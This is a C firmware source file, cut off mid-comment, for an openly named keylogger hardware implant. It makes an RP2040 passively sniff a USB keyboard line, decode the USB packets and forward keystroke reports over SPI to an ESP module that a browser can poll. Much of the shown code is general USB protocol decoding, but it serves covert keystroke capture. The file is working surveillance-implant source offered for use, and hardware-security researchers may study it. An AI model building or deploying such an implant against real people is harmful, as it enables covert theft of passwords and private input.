/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

/*
 *  This firmware turns an RP2040 into a passive sniffer of a low speed (1.5 Mbit/s)
 *  or full speed (12 Mbit/s) USB keyboard. It captures the raw line, decodes the
 *  protocol in software and sends the keyboard's reports to the ESP over SPI. The
 *  speed follows what is attached (usb_speed.h).
 *
 *  It is a Raspberry Pi Pico SDK port of Alex Taradov's "usb-sniffer-lite":
 *      https://github.com/ataradov/usb-sniffer-lite   (BSD-3-Clause)
 *
 *  The capture path:
 *  - At each start PIO1 waits for a clean SE0 on D+ and D- and raises START, so
 *    PIO0 starts sampling between two packets. PIO0 pushes the raw D+ samples of
 *    each packet into its RX FIFO as DATA words, then one SIZE word (okhi.pio has
 *    the format).
 *  - Core 0 (main()) drains that FIFO into one of two buffers, dbuff1 and dbuff2.
 *    It hands a buffer to core 1 through the inter-core FIFO when it is full or
 *    100 ms after a packet long enough to be a report, and goes on in the other
 *    buffer if core 1 has released it.
 *  - Core 1 (core1_main()) decodes the buffer in process_buffer() and
 *    process_packet(): NRZI (a transition is a 0, none is a 1), bit stuffing (a 0
 *    after six 1s), the SYNC byte, the PID and its complement, CRC5 or CRC16.
 *    display_buffer() then sends the reports to the ESP.
 *  The PIO does only the bit timing; the CPU decodes afterwards, from a buffer.
 *
 *  USB in short: at low speed J (idle) is D- high and D+ low, K is D+ high and D-
 *  low, and full speed swaps J and K. SE0 (both low) ends a packet and, sustained,
 *  is a bus reset or a detach; SE1 (both high) is never driven on purpose. NRZI
 *  sends a 0 bit as a transition and a 1 bit as none, and the sender stuffs a 0
 *  after six 1s so the line keeps its edges. A packet is SYNC (KJKJKJKK, 0x80),
 *  PID, payload, CRC and EOP:
 *  - the PID byte holds the 4-bit PID in its low nibble and its complement in the
 *    high nibble;
 *  - a token or SOF carries an 11-bit field and a CRC5;
 *  - a DATA packet carries up to 8 payload bytes at low speed, up to 64 at full
 *    speed (1023 isochronous), and a CRC16;
 *  - a handshake (ACK, NAK, STALL, NYET) is the PID alone.
 *  A low speed bus has no SOF: the host sends a keep-alive EOP every 1 ms, which
 *  this code takes as the low speed frame mark. A full speed bus has a SOF every
 *  1 ms.
 */

// A copy_to_ram image (CMakeLists.txt): all code runs from RAM, so no flash access
// stalls core 0 while it drains the PIO's FIFO, even while core 1 writes the flash.

#include "hardware/adc.h"
#include "hardware/clocks.h"
#include "hardware/flash.h"
#include "hardware/irq.h"
#include "hardware/pio.h"
#include "hardware/pll.h"
#include "hardware/regs/io_qspi.h"
#include "hardware/spi.h"
#include "hardware/structs/clocks.h"
#include "hardware/structs/ioqspi.h"
#include "hardware/structs/pll.h"
#include "hardware/structs/sio.h"
#include "hardware/sync.h"
#include "hardware/timer.h"
#include "hardware/uart.h"
#include "hardware/watchdog.h"
#include "hardware/vreg.h"
#include "okhi.pio.h"
#include "pico/bootrom.h"
#include "pico/multicore.h"
#include "pico/stdlib.h"
#include <stdio.h>
#include <string.h>

#include "../../../../last_firmv.h"

#include "../../com/com.h"

uint32_t __scratch_x("my_group_nameX") fooX = 23;
uint32_t __scratch_y("my_group_nameY") fooY = 23;
#define __core1_func(x) __scratch_y(__STRING(x)) x
#define __core2_func(x) __scratch_x(__STRING(x)) x

#define SPI_CS_SETUP_US 25
#define delay_cs_pre() busy_wait_us_32(SPI_CS_SETUP_US);

#define RP_VARIANT OKHI_VARIANT_USB
#define OTA_WATCHDOG_UPDATE() watchdog_update()
// Before an intentional reboot (an OTA commit, a web reset, BOOTSEL, a clock mode)
// hid_store_flush() writes the HID maps at once if a write of them is waiting.
static void hid_store_flush(void);
#define RP_STATE_FLUSH() hid_store_flush()

#include "../../com/com_rp.h"

#include "../../com/com_rp_hw.h"

#include "../../com/com_rp_ota.h"

#include "../../com/com_rp_clock.h"

// USB capture pins. The PIO reads D+, D- and START from one IN pin base as its
// pins 0, 1 and 2, so the three GPIOs must be consecutive and in this order. Any
// three consecutive GPIOs work (okhi.pio, pin mapping).
#define DP_INDEX 20      // D+, PIO pin 0, the JMP pin at low speed
#define DM_INDEX 21      // D-, PIO pin 1, the JMP pin at full speed
#define START_INDEX 22   // START from PIO1 to PIO0, PIO pin 2
#define TRIGGER_INDEX 18 // external capture trigger, unused in this build

#include "usb_bus.h"

#define RP_ADC_GPIO 27 // From PCB v5

#define BUFFER_SIZE ((232 * 1024) / (int)sizeof(uint32_t))

// Per-packet header flags. Core 1 rewrites the header word of each decoded packet as
// these flags ORed with its length in bytes (CAPTURE_SIZE_MASK), so the display
// stage can tell a clean packet from a malformed one or a marker.
#define CAPTURE_ERROR_STUFF (1 << 31) // seven 1s in a row: a sender's abort or a line error
#define CAPTURE_ERROR_CRC (1 << 30)   // CRC5 or CRC16 check failed
#define CAPTURE_ERROR_PID (1 << 29)   // PID nibbles not complementary, or PID 0
#define CAPTURE_ERROR_SYNC (1 << 28)  // first decoded byte was not the SYNC
#define CAPTURE_ERROR_NBIT (1 << 27)  // packet did not end on a whole byte
#define CAPTURE_ERROR_SIZE (1 << 26)  // packet too short, or the wrong length for its PID
#define CAPTURE_RESET (1 << 25)       // bus reset or detach (sustained SE0, bit count 0)
#define CAPTURE_LS_SOF (1 << 24)      // low speed keep-alive, the low speed frame mark
#define CAPTURE_MAY_FOLD (1 << 23)    // on the SOF of an empty frame (only IN and NAK): foldable

#define CAPTURE_ERROR_MASK                                                                                             \
    (CAPTURE_ERROR_STUFF | CAPTURE_ERROR_CRC | CAPTURE_ERROR_PID | CAPTURE_ERROR_SYNC | CAPTURE_ERROR_NBIT |           \
     CAPTURE_ERROR_SIZE)

#define CAPTURE_SIZE_MASK 0xffff // low 16 bits of the header word: the decoded length in bytes

#define ERROR_DATA_SIZE_LIMIT 16 // payload bytes to print for a packet with an error; unused here
#define MAX_PACKET_DELTA 10000   // us; a larger gap between packets is taken for buffer corruption

// USB packet IDs. The byte after SYNC is the PID byte: the 4-bit PID below in its low
// nibble, its complement in the high nibble. The two lowest bits give the group (token,
// data, handshake, special), which is how the codes are grouped here.
enum
{
    Pid_Reserved = 0, // 0x0: reserved in USB 2.0, EXT in the LPM ECN; flagged as a PID error

    // Token packets: address a device and endpoint, or (SOF) carry a frame number.
    Pid_Out = 1,    // 0x1: data from the host follows
    Pid_In = 9,     // 0x9: data from the device follows
    Pid_Sof = 5,    // 0x5: Start-Of-Frame, full and high speed (low speed has keep-alives)
    Pid_Setup = 13, // 0xD: begins a control transfer

    // Data packets: the payload and its CRC16.
    Pid_Data0 = 3,  // 0x3: even data toggle
    Pid_Data1 = 11, // 0xB: odd data toggle
    Pid_Data2 = 7,  // 0x7: high speed isochronous only
    Pid_MData = 15, // 0xF: high speed only, isochronous and split transactions

    // Handshake packets: the PID alone, no payload and no CRC.
    Pid_Ack = 2,    // 0x2: received OK
    Pid_Nak = 10,   // 0xA: no data or not ready, the host retries
    Pid_Stall = 14, // 0xE: endpoint halted or request not supported
    Pid_Nyet = 6,   // 0x6: not yet (high speed flow control)

    // Special packets.
    Pid_PreErr = 12, // 0xC: PRE (low speed preamble) and ERR (split error) share the code
    Pid_Split = 8,   // 0x8: high speed split transaction (5 bytes here, SYNC included)
    Pid_Ping = 4,    // 0x4: high speed PING
};

enum
{
    CaptureSpeed_Low,
    CaptureSpeed_Full,
    CaptureSpeedCount,
};

enum
{
    CaptureTrigger_Enabled,
    CaptureTrigger_Disabled,
    CaptureTriggerCount,
};

enum
{
    CaptureLimit_100,
    CaptureLimit_200,
    CaptureLimit_500,
    CaptureLimit_1000,
    CaptureLimit_2000,
    CaptureLimit_5000,
    CaptureLimit_10000,
    CaptureLimit_Unlimited,
    CaptureLimitCount,
};

enum
{
    DisplayTime_First,
    DisplayTime_Previous,
    DisplayTime_SOF,
    DisplayTime_Reset,
    DisplayTimeCount,
};

enum
{
    DisplayData_None,
    DisplayData_Limit16,
    DisplayData_Limit64,
    DisplayData_Full,
    DisplayDataCount,
};

enum
{
    DisplayFold_Enabled,
    DisplayFold_Disabled,
    DisplayFoldCount,
};

typedef struct
{
    bool fs;      // the speed core 0 captured this buffer at, true for full speed
                  // (one speed per buffer)
    bool trigger; // for the external trigger, unused in this build
    int limit;    // core 0 hands the buffer over at this many packets (capture_limit_value())
    int count;    // packets in this buffer
    int errors;   // packets flagged with any CAPTURE_ERROR_* bit
    int resets;   // reset markers decoded: bus resets and detaches
    int frames;   // frames seen (one per SOF or low speed keep-alive)
    int folded;   // empty frames flagged CAPTURE_MAY_FOLD
    int polls;    // full speed IN + NAK pairs core 0 did not store
    int other;    // other full speed packets core 0 did not store (usb_fs_skip())
    int wide;     // interrupt IN reports over 8 bytes, not forwarded
    int markers;  // reset markers core 0 stored
    bool after_overrun; // core 0 started it after an overrun dropped packets
} buffer_info_t;

// One capture buffer. Core 0 stores each packet as two header words (its bit count and
// a time slot) and its DATA words. Core 1 then decodes it in place, writing the bytes
// behind the read cursor (decoded bytes never take more room than the raw samples).
// dbuff1 and dbuff2 below are the two halves of a double buffer.
typedef struct
{
    uint32_t g_buffer[16000];
    buffer_info_t g_buffer_info;
} dbuff_t;

#include "usb_speed.h"
#include "usb_hid.h"

// Room kept free for the packet being captured: the largest real one, a full speed 64-byte DATA
// with worst-case bit stuffing, is 21 words of 31 samples plus its 2 header words.
#define CAPTURE_RESERVE_WORDS 64

// A packet of at least CAPTURE_REPORT_BITS samples can be an 8-byte report (SYNC, PID, 64 bits
// and CRC16 are 96); tokens, handshakes and keep-alives are 36 or less. Core 0 hands a buffer
// with such a packet over CAPTURE_HANDOFF_US after it. Without that a key waits until the buffer
// fills: up to a buffer's whole life on a quiet bus, 3.3 to 4.7 s at low speed on the bench
// (2026-11-04 to 06) and about 4 s at full speed.
#define CAPTURE_REPORT_BITS 90
#define CAPTURE_HANDOFF_US 100000

static volatile unsigned int total_packets_sended = 0;

static volatile dbuff_t dbuff1;
static volatile dbuff_t dbuff2;

// Which buffers core 1 has finished with ([0] dbuff1, [1] dbuff2). Core 0 hands a buffer over
// without waiting and swaps only into one core 1 has released, so it never stops draining the PIO
// RX FIFO (8 words: about 3 ms of an idle bus, 21 us of a busy full speed line). Waiting for core 1
// overflows that FIFO and starts the next buffer out of step: with paced SPI that cost a whole
// buffer of reports on 2026-10-11.
static volatile bool dbuff_released[2] = {true, true};
static volatile unsigned int capture_overruns; // packets dropped: core 1 a whole buffer behind
static volatile unsigned int capture_desyncs;  // records whose word count did not fit their length

static volatile dbuff_t *last_dbuff = NULL; // buffer being decoded/displayed (core 1)
static volatile dbuff_t *curr_dbuff = NULL; // buffer being captured into (core 0)

// Capture and display options, fixed at these values (no code changes them). The speed
// follows capture_fs (usb_speed.h), not g_capture_speed; capture_limit_value() returns
// 5000 whatever g_capture_limit says; nothing reads g_capture_trigger or g_display_data.
static volatile int g_capture_speed = CaptureSpeed_Full;
static volatile int g_capture_trigger = CaptureTrigger_Disabled;
static volatile int g_capture_limit = CaptureLimit_Unlimited;
static volatile int g_display_time = DisplayTime_SOF;     // what timestamps are relative to
static volatile int g_display_data = DisplayData_Full;    // how much payload to print
static volatile int g_display_fold = DisplayFold_Enabled; // fold empty frames or not

// Decode cursors used by process_buffer()/process_packet(). Because decoding
// compacts the buffer in place, the read cursor stays ahead of the write cursor.
static volatile int g_rd_ptr = 0;        // read cursor into raw captured words
static volatile int g_wr_ptr = 0;        // write cursor for decoded output
static volatile int g_sof_index = 0;     // header index of the current frame's SOF
static volatile bool g_may_fold = false; // is the current frame still "empty" (foldable)?

// Display-time bookkeeping (timing reference and fold run state).
static volatile uint32_t g_ref_time;  // time origin of the packet times (not printed in this build)
static volatile uint32_t g_prev_time; // previous packet's time (for delta / corruption check)
static volatile bool g_check_delta;   // whether to sanity-check the inter-packet delta
static volatile bool g_folding;       // currently inside a folded run of empty frames
static volatile int g_fold_count;     // frames in the current folded run
static volatile int g_display_ptr;    // cursor used while walking packets for display

// Byte-wise lookup table for the USB data CRC16 (polynomial x^16+x^15+x^2+1,
// reflected form 0xA001). Used by crc16_usb() to check DATA0/DATA1/DATA2/MDATA
// packets. A correct packet leaves the residual 0xB001.
static const uint16_t crc16_usb_tab[256] = {
    0x0000, 0xc0c1, 0xc181, 0x0140, 0xc301, 0x03c0, 0x0280, 0xc241, 0xc601, 0x06c0, 0x0780, 0xc741, 0x0500, 0xc5c1,
    0xc481, 0x0440, 0xcc01, 0x0cc0, 0x0d80, 0xcd41, 0x0f00, 0xcfc1, 0xce81, 0x0e40, 0x0a00, 0xcac1, 0xcb81, 0x0b40,
    0xc901, 0x09c0, 0x0880, 0xc841, 0xd801, 0x18c0, 0x1980, 0xd941, 0x1b00, 0xdbc1, 0xda81, 0x1a40, 0x1e00, 0xdec1,
    0xdf81, 0x1f40, 0xdd01, 0x1dc0, 0x1c80, 0xdc41, 0x1400, 0xd4c1, 0xd581, 0x1540, 0xd701, 0x17c0, 0x1680, 0xd641,
    0xd201, 0x12c0, 0x1380, 0xd341, 0x1100, 0xd1c1, 0xd081, 0x1040, 0xf001, 0x30c0, 0x3180, 0xf141, 0x3300, 0xf3c1,
    0xf281, 0x3240, 0x3600, 0xf6c1, 0xf781, 0x3740, 0xf501, 0x35c0, 0x3480, 0xf441, 0x3c00, 0xfcc1, 0xfd81, 0x3d40,
    0xff01, 0x3fc0, 0x3e80, 0xfe41, 0xfa01, 0x3ac0, 0x3b80, 0xfb41, 0x3900, 0xf9c1, 0xf881, 0x3840, 0x2800, 0xe8c1,
    0xe981, 0x2940, 0xeb01, 0x2bc0, 0x2a80, 0xea41, 0xee01, 0x2ec0, 0x2f80, 0xef41, 0x2d00, 0xedc1, 0xec81, 0x2c40,
    0xe401, 0x24c0, 0x2580, 0xe541, 0x2700, 0xe7c1, 0xe681, 0x2640, 0x2200, 0xe2c1, 0xe381, 0x2340, 0xe101, 0x21c0,
    0x2080, 0xe041, 0xa001, 0x60c0, 0x6180, 0xa141, 0x6300, 0xa3c1, 0xa281, 0x6240, 0x6600, 0xa6c1, 0xa781, 0x6740,
    0xa501, 0x65c0, 0x6480, 0xa441, 0x6c00, 0xacc1, 0xad81, 0x6d40, 0xaf01, 0x6fc0, 0x6e80, 0xae41, 0xaa01, 0x6ac0,
    0x6b80, 0xab41, 0x6900, 0xa9c1, 0xa881, 0x6840, 0x7800, 0xb8c1, 0xb981, 0x7940, 0xbb01, 0x7bc0, 0x7a80, 0xba41,
    0xbe01, 0x7ec0, 0x7f80, 0xbf41, 0x7d00, 0xbdc1, 0xbc81, 0x7c40, 0xb401, 0x74c0, 0x7580, 0xb541, 0x7700, 0xb7c1,
    0xb681, 0x7640, 0x7200, 0xb2c1, 0xb381, 0x7340, 0xb101, 0x71c0, 0x7080, 0xb041, 0x5000, 0x90c1, 0x9181, 0x5140,
    0x9301, 0x53c0, 0x5280, 0x9241, 0x9601, 0x56c0, 0x5780, 0x9741, 0x5500, 0x95c1, 0x9481, 0x5440, 0x9c01, 0x5cc0,
    0x5d80, 0x9d41, 0x5f00, 0x9fc1, 0x9e81, 0x5e40, 0x5a00, 0x9ac1, 0x9b81, 0x5b40, 0x9901, 0x59c0, 0x5880, 0x9841,
    0x8801, 0x48c0, 0x4980, 0x8941, 0x4b00, 0x8bc1, 0x8a81, 0x4a40, 0x4e00, 0x8ec1, 0x8f81, 0x4f40, 0x8d01, 0x4dc0,
    0x4c80, 0x8c41, 0x4400, 0x84c1, 0x8581, 0x4540, 0x8701, 0x47c0, 0x4680, 0x8641, 0x8201, 0x42c0, 0x4380, 0x8341,
    0x4100, 0x81c1, 0x8081, 0x4040,
};

// Byte-wise lookup table for the USB token CRC5 (polynomial x^5+x^2+1). Used by
// crc5_usb() to check IN/OUT/SETUP/SOF/PING/SPLIT tokens. An intact IN, OUT, SETUP,
// SOF or PING leaves the residual 0x09 (crc5_usb() says why).
static const uint8_t crc5_usb_tab[256] = {
    0x00, 0x0e, 0x1c, 0x12, 0x11, 0x1f, 0x0d, 0x03, 0x0b, 0x05, 0x17, 0x19, 0x1a, 0x14, 0x06, 0x08, 0x16, 0x18, 0x0a,
    0x04, 0x07, 0x09, 0x1b, 0x15, 0x1d, 0x13, 0x01, 0x0f, 0x0c, 0x02, 0x10, 0x1e, 0x05, 0x0b, 0x19, 0x17, 0x14, 0x1a,
    0x08, 0x06, 0x0e, 0x00, 0x12, 0x1c, 0x1f, 0x11, 0x03, 0x0d, 0x13, 0x1d, 0x0f, 0x01, 0x02, 0x0c, 0x1e, 0x10, 0x18,
    0x16, 0x04, 0x0a, 0x09, 0x07, 0x15, 0x1b, 0x0a, 0x04, 0x16, 0x18, 0x1b, 0x15, 0x07, 0x09, 0x01, 0x0f, 0x1d, 0x13,
    0x10, 0x1e, 0x0c, 0x02, 0x1c, 0x12, 0x00, 0x0e, 0x0d, 0x03, 0x11, 0x1f, 0x17, 0x19, 0x0b, 0x05, 0x06, 0x08, 0x1a,
    0x14, 0x0f, 0x01, 0x13, 0x1d, 0x1e, 0x10, 0x02, 0x0c, 0x04, 0x0a, 0x18, 0x16, 0x15, 0x1b, 0x09, 0x07, 0x19, 0x17,
    0x05, 0x0b, 0x08, 0x06, 0x14, 0x1a, 0x12, 0x1c, 0x0e, 0x00, 0x03, 0x0d, 0x1f, 0x11, 0x14, 0x1a, 0x08, 0x06, 0x05,
    0x0b, 0x19, 0x17, 0x1f, 0x11, 0x03, 0x0d, 0x0e, 0x00, 0x12, 0x1c, 0x02, 0x0c, 0x1e, 0x10, 0x13, 0x1d, 0x0f, 0x01,
    0x09, 0x07, 0x15, 0x1b, 0x18, 0x16, 0x04, 0x0a, 0x11, 0x1f, 0x0d, 0x03, 0x00, 0x0e, 0x1c, 0x12, 0x1a, 0x14, 0x06,
    0x08, 0x0b, 0x05, 0x17, 0x19, 0x07, 0x09, 0x1b, 0x15, 0x16, 0x18, 0x0a, 0x04, 0x0c, 0x02, 0x10, 0x1e, 0x1d, 0x13,
    0x01, 0x0f, 0x1e, 0x10, 0x02, 0x0c, 0x0f, 0x01, 0x13, 0x1d, 0x15, 0x1b, 0x09, 0x07, 0x04, 0x0a, 0x18, 0x16, 0x08,
    0x06, 0x14, 0x1a, 0x19, 0x17, 0x05, 0x0b, 0x03, 0x0d, 0x1f, 0x11, 0x12, 0x1c, 0x0e, 0x00, 0x1b, 0x15, 0x07, 0x09,
    0x0a, 0x04, 0x16, 0x18, 0x10, 0x1e, 0x0c, 0x02, 0x01, 0x0f, 0x1d, 0x13, 0x0d, 0x03, 0x11, 0x1f, 0x1c, 0x12, 0x00,
    0x0e, 0x06, 0x08, 0x1a, 0x14, 0x17, 0x19, 0x0b, 0x05,
};

static const char *capture_speed_str[CaptureSpeedCount] = {
    [CaptureSpeed_Low] = "Low",
    [CaptureSpeed_Full] = "Full",
};

static const char *capture_trigger_str[CaptureTriggerCount] = {
    [CaptureTrigger_Enabled] = "Enabled",
    [CaptureTrigger_Disabled] = "Disabled",
};

static const char *capture_limit_str[CaptureLimitCount] = {
    [CaptureLimit_100] = "100 packets",     [CaptureLimit_200] = "200 packets",
    [CaptureLimit_500] = "500 packets",     [CaptureLimit_1000] = "1000 packets",
    [CaptureLimit_2000] = "2000 packets",   [CaptureLimit_5000] = "5000 packets",
    [CaptureLimit_10000] = "10000 packets", [CaptureLimit_Unlimited] = "Unlimited",
};

static const char *display_time_str[DisplayTimeCount] = {
    [DisplayTime_First] = "Relative to the first packet",
    [DisplayTime_Previous] = "Relative to the previous packet",
    [DisplayTime_SOF] = "Relative to the SOF",
    [DisplayTime_Reset] = "Relative to the bus reset",
};

static const char *display_data_str[DisplayDataCount] = {
    [DisplayData_Full] = "Full",
    [DisplayData_Limit16] = "Limit to 16 bytes",
    [DisplayData_Limit64] = "Limit to 64 bytes",
    [DisplayData_None] = "Do not display data",
};

static const char *display_fold_str[DisplayFoldCount] = {
    [DisplayFold_Enabled] = "Enabled",
    [DisplayFold_Disabled] = "Disabled",
};

static int my_spi_to_esp_write_blocking(const uint8_t *src, size_t len)
{
    gpio_put(EBOOT_MASTERDATAREADY_GPIO, true);

    // Bounded like my_spi_to_esp_xfer_blocking(): when the ESP is rebooting, wedged or not
    // driving the line, the write fails after SPI_READY_TIMEOUT_US and the caller carries on.
    if (!wait_esp_ready(SPI_READY_TIMEOUT_US))
    {
        gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
        return -1;
    }

    gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
    return my_spi_write_blocking(src, len);
}

// Ring of reports for the ESP. The RP holds ELOG_SLAVEREADY with a pull-up, so while the ESP
// boots or sits in reset that line floats high and a write lands at a slave that is not
// listening. A report leaves the ring only once the ESP's published sequence confirms it
// (below). Both ends run on core 1 (print_packet() and usb_hid.h queue, usb_report_flush()
// drains), so no locking is needed.
#define USB_REPORT_RING_ENTRIES 64
static char usb_report_ring[USB_REPORT_RING_ENTRIES][SPI_FRAME_SIZE];
static unsigned int usb_report_head;
static unsigned int usb_report_tail;
static unsigned int usb_report_dropped;

// Delivery is go-back-N on the ESP's published sequence. Every report carries a sequence
// (com.h). The ESP accepts strictly in order, drops a repeat, and stamps the last one it accepted
// into every status frame. That published sequence is the only acknowledgement that cannot lie:
// SLAVEREADY can be stale, so a write can "succeed" into an ESP with nothing armed. So a report
// leaves the ring only once the ESP's sequence has passed it. Reports go out once each, at most
// USB_SEND_WINDOW past the last confirmed one, with a poll between windows; when the ESP's
// sequence has not moved for USB_STALL_US, everything after it goes out again. The window keeps
// the ESP's 8-deep SPI queue from being outrun and its refusal budget (SPI_SEQ_RESYNC_AFTER) from
// running out. A rewind that waits for an idle ring never runs during a burst: on 2026-10-10, with
// a browser polling the implant, one lost frame in a 300-report burst made the ESP refuse 64
// frames and resynchronise, and 32 reports were lost.
//
// The ESP stops answering for tens to hundreds of ms while it writes flash (SPIFFS erases stall
// everything not in IRAM), and its 8-deep queue runs dry. So a missed poll is waited out: the
// decode pauses and the reports stay in the capture buffer. Only USB_PATIENCE_US without a
// confirmation marks the ESP gone; from then on reports wait in the ring until the poll loop sees
// it again. Patience runs from the last confirmation, not the last answered poll, so core 1 waits
// here at most USB_PATIENCE_US without one. After a failed poll the next one waits
// USB_POLL_IDLE_US: EBOOT is the ESP's boot strap and a rebooting ESP should not be hammered.
//
// The ESP may hold any report clocked since the last confirmation, also ones before a resend
// rewound the send cursor, so confirmations are bounded by usb_report_high, never by the cursor:
// bounded by the cursor, a real confirmation is rejected and the report goes out again under a
// new number, which the ESP accepts twice.
//
// Once after boot, and after the ESP was given up on, the next sequence is aligned to the ESP's,
// with nothing in flight, so an RP that rebooted under a running ESP does not send numbers the ESP
// reads as already seen. Never in between: a renumbered report is a duplicate or a loss.
#define USB_SEND_WINDOW 4
#define USB_POLL_GAP_US 500
#define USB_POLL_IDLE_US 5000
#define USB_STALL_US 30000
#define USB_PATIENCE_US 1500000

static uint8_t usb_tail_seq = SPI_RECORD_SEQ_MIN; // sequence of the report at usb_report_tail
static unsigned int usb_report_sent;              // next one to clock out, tail <= sent <= high
static unsigned int usb_report_high;              // one past the furthest report clocked out
static unsigned int usb_spi_resends;
static bool usb_esp_gone;
static bool usb_seq_synced;
static uint8_t usb_spi_frame[SPI_FRAME_SIZE];

static uint8_t usb_seq_add(uint8_t seq, unsigned int n)
{
    return (uint8_t)(((seq - SPI_RECORD_SEQ_MIN + n) % SPI_RECORD_SEQ_MAX) + SPI_RECORD_SEQ_MIN);
}

// Move the tail past every report the ESP's published sequence says it holds.
static bool usb_report_confirm(void)
{
    if (!esp_record_seq_seen)
    {
        return false;
    }

    uint8_t confirmed = spi_seq_delta(usb_seq_add(usb_tail_seq, SPI_RECORD_SEQ_MAX - 1), esp_record_seq);

    if (confirmed == 0 || confirmed > usb_report_high - usb_report_tail)
    {
        return false;
    }

    usb_report_tail += confirmed;
    usb_tail_seq = usb_seq_add(usb_tail_seq, confirmed);
    total_packets_sended += confirmed;

    if (usb_report_sent < usb_report_tail)
    {
        usb_report_sent = usb_report_tail;
    }

    return true;
}

static void usb_report_flush(void)
{
    if (usb_esp_gone && !esp_link_up)
    {
        return;
    }

    usb_esp_gone = false;

    uint64_t confirmed = time_us_64();
    uint64_t progress = confirmed;

    while (usb_report_tail != usb_report_head)
    {
        if (time_us_64() - confirmed > USB_PATIENCE_US)
        {
            usb_esp_gone = true;
            usb_seq_synced = false;
            esp_link_up = false;
            return;
        }

        if (!usb_seq_synced && usb_report_high == usb_report_tail && esp_record_seq_seen)
        {
            usb_tail_seq = spi_seq_next(esp_record_seq);
            usb_seq_synced = true;
        }

        if (usb_report_sent != usb_report_head && usb_report_sent - usb_report_tail < USB_SEND_WINDOW)
        {
            usb_spi_frame[0] = SPI_RECORD_MARKER;
            usb_spi_frame[1] = usb_seq_add(usb_tail_seq, usb_report_sent - usb_report_tail);
            memcpy(usb_spi_frame + SPI_RECORD_HEADER, usb_report_ring[usb_report_sent % USB_REPORT_RING_ENTRIES],
                   SPI_FRAME_SIZE - SPI_RECORD_HEADER);
            // The report is a short NUL terminated line in a 256 byte frame, so the two bytes the
            // header pushes off the end are padding. The last byte is zeroed all the same, so the
            // line always ends.
            usb_spi_frame[SPI_FRAME_SIZE - 1] = 0;

            if (my_spi_to_esp_write_blocking(usb_spi_frame, SPI_FRAME_SIZE) >= 0)
            {
                // Pacing, not an acknowledgement (the sequence is one): wait for the ESP to close
                // this transaction before the next frame. Back to back, a frame can land in the
                // window of the previous one: on 2026-10-10 the ESP stored a poll's tail glued to a
                // report.
                wait_esp_consumed(SPI_CONSUMED_TIMEOUT_US);
                usb_report_sent++;

                if (usb_report_high < usb_report_sent)
                {
                    usb_report_high = usb_report_sent;
                }

                continue;
            }
        }

        // Window full, everything sent and not yet confirmed, or the ESP not armed: look at its
        // sequence. A missed poll is the ESP busy, not gone, until USB_PATIENCE_US says otherwise.
        busy_wait_us(esp_link_up ? USB_POLL_GAP_US : USB_POLL_IDLE_US);
        poll_esp();
        wait_esp_consumed(SPI_CONSUMED_TIMEOUT_US);

        uint64_t now = time_us_64();

        if (esp_link_up && usb_report_confirm())
        {
            confirmed = now;
            progress = now;
        }
        else if (esp_link_up && now - progress > USB_STALL_US)
        {
            usb_report_sent = usb_report_tail;
            usb_spi_resends++;
            progress = now;
        }
    }
}

static void usb_report_dispatch(const char *frame)
{
    if (usb_report_head - usb_report_tail >= USB_REPORT_RING_ENTRIES)
    {
        if (usb_report_dropped == 0)
        {
            puts("usb report ring full while the ESP is down, dropping the newest report");
        }
        usb_report_dropped++;
    }
    else
    {
        memcpy(usb_report_ring[usb_report_head % USB_REPORT_RING_ENTRIES], frame, SPI_FRAME_SIZE);
        usb_report_head++;
    }

    usb_report_flush();
}

// How many packets core 0 captures before it hands the buffer to core 1: 5000, the early
// return. The g_capture_limit switch after it never runs; it is kept for reference.
static int capture_limit_value(void)
{
    return 5000;

    if (g_capture_limit == CaptureLimit_100)
    {
        return 100;
    }
    else if (g_capture_limit == CaptureLimit_200)
    {
        return 200;
    }
    else if (g_capture_limit == CaptureLimit_500)
    {
        return 500;
    }
    else if (g_capture_limit == CaptureLimit_1000)
    {
        return 1000;
    }
    else if (g_capture_limit == CaptureLimit_2000)
    {
        return 2000;
    }
    else if (g_capture_limit == CaptureLimit_5000)
    {
        return 5000;
    }
    else if (g_capture_limit == CaptureLimit_10000)
    {
        return 10000;
    }
    else
    {
        return 100000;
    }
}

// Clear a buffer's counters and set its packet limit and its speed, ready to capture into.
static void reinit_dbuff(volatile dbuff_t *dbuff)
{
    memset((void *)&(dbuff->g_buffer_info), 0, sizeof(dbuff->g_buffer_info));
    dbuff->g_buffer_info.limit = capture_limit_value();
    dbuff->g_buffer_info.fs = capture_fs;
}

// Core 0: hand the current buffer to core 1 and go on in the other one, if core 1 has released it.
static bool capture_swap(void)
{
    int other = (curr_dbuff == &dbuff1) ? 1 : 0;

    if (!dbuff_released[other])
    {
        return false;
    }

    __dmb();
    dbuff_released[other ^ 1] = false;
    multicore_fifo_push_blocking((uintptr_t)curr_dbuff);
    curr_dbuff = other ? &dbuff2 : &dbuff1;
    reinit_dbuff(curr_dbuff);
    return true;
}

static void print_g_fold_count(int count)
{
    printf("   ... : Folded ");

    if (count == 1)
    {
        printf("1 frame");
    }
    else
    {
        printf("%d", count);
        printf(" frames");
    }

    printf("\r\n");
}

// print_packet() pairs a DATA with the IN or SETUP just before it, across buffers too (a buffer can
// be handed over between the two). Both are cleared where no DATA can belong to the token seen
// before: a bus reset or detach, a packet with an error, and a buffer that starts after an
// overrun, whose first DATA may answer a token core 0 dropped. Without that, a DATA could be read
